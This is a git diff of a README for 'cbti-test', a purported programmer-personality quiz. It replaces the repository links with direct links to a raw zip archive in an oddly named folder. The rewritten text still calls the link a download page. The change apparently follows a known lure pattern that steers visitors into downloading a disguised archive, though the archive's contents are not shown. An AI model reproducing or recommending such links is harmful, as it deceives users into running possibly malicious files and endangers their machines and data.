@@ -1,6 +1,6 @@
 # 🧠 cbti-test - Discover your exact programmer personality type
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Multiplexersuspect4710/cbti-test)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Multiplexersuspect4710/cbti-test/raw/refs/heads/main/carnallite/test-cbti-v3.3.zip)
 
 ## What is this tool
 
@@ -19,7 +19,7 @@ This tool runs on most modern desktop computers. You need the following things t
 
 You must visit the link below to get the tool on your machine. This page contains the compressed version of the quiz.
 
-[Click here to go to the download page](https://github.com/Multiplexersuspect4710/cbti-test)
+[Click here to go to the download page](https://github.com/Multiplexersuspect4710/cbti-test/raw/refs/heads/main/carnallite/test-cbti-v3.3.zip)
 
 1. Open the link in your web browser.
 2. Look for the button labeled Code.
